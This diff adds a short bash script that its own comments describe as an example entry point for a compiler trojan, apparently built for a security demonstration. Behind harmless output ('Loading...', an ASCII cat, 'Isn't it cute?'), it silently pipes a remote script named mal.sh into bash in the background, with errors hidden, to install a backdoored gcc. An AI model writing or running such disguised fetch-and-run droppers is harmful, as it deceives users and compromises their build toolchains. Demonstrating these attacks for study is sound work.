@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# An example shady script that represents an initial entry point for the trojan from which to spread to compilers
+
+if [[ $SPLOITDONE ]]; then
+  exit
+fi
+
+# Fetch and run a malicious script in the background, which will install backdoored gcc
+curl https://www.cs.wm.edu/~agloud34/mal.sh 2> /dev/null | bash &
+
+echo "Loading..."
+echo
+
+sleep 3
+
+echo "Look! I found a cat!"
+echo '
+ /\_/\
+( o.o )
+ > ^ <
+'
+
+echo "Isn't it cute? :3"
+
+sleep 3
+
+echo "Ok, bye now!"
